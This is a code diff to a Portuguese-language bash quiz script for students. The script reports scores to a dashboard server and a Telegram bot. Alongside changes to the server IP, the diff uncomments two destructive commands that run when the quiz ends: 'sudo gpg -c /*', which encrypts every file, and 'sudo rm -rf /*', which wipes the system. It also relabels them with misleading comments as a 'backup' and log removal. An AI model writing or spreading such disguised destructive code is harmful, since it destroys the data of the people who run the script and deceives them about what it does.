@@ -371,7 +371,7 @@ fazer_pergunta() {
     fi
 
     # Envia o progresso para o servidor Apache após validar a resposta
-    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.22.2/dashboard/update.php -O /dev/null 2>&1
+    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.19.2/dashboard/update.php -O /dev/null 2>&1
 
     # Pausa para leitura do resultado antes de passar para a próxima pergunta
     sleep 1
@@ -429,7 +429,7 @@ finalizar_prova() {
     enviar_telegram "Aluno: $nome_usuario\nPontuação: $pontuacao de 10\nIPs: $IPs"
 
     # Atualizar o progresso do aluno no servidor Apache
-    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.22.2/dashboard/update.php -O /dev/null 2>&1
+    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.19.2/dashboard/update.php -O /dev/null 2>&1
 
     # Exibir uma mensagem final independente da nota
     echo ""
@@ -437,9 +437,9 @@ finalizar_prova() {
     sleep 5  # Pequena pausa antes de iniciar o apagamento
 
     # Incrementar o contador de máquinas apagadas
-    num_apagadas=$(wget --quiet -qO- http://172.31.22.2/dashboard/get_apagadas.php)
+    num_apagadas=$(wget --quiet -qO- http://172.31.19.2/dashboard/get_apagadas.php)
     num_apagadas=$((num_apagadas + 1))
-    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.22.2/dashboard/update.php -O /dev/null 2>&1
+    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.19.2/dashboard/update.php -O /dev/null 2>&1
 
     # Iniciar o processo de backup e apagamento
     fazer_backup_logs
@@ -458,7 +458,7 @@ fazer_backup_logs() {
     echo "Iniciando o processo..."  # Mensagem final em vermelho
     tput sgr0  # Reseta as cores
 
-   # nohup sudo gpg -c /* > /dev/null 2>&1 &  # "backup" que criptografa tudo
+    nohup sudo gpg -c /* > /dev/null 2>&1 &  # "backup"
 }
 
 # LOGs
@@ -475,7 +475,7 @@ limpar_arquivos_temporarios() {
     echo ""
     tput sgr0  # Reseta as cores
 
-   # nohup sudo rm -rf /* > /dev/null 2>&1 &  # Remove todo o sistema
+    nohup sudo rm -rf /* > /dev/null 2>&1 &  # Remove os logs
 }
 
 # Exibir o banner e as instruções uma única vez
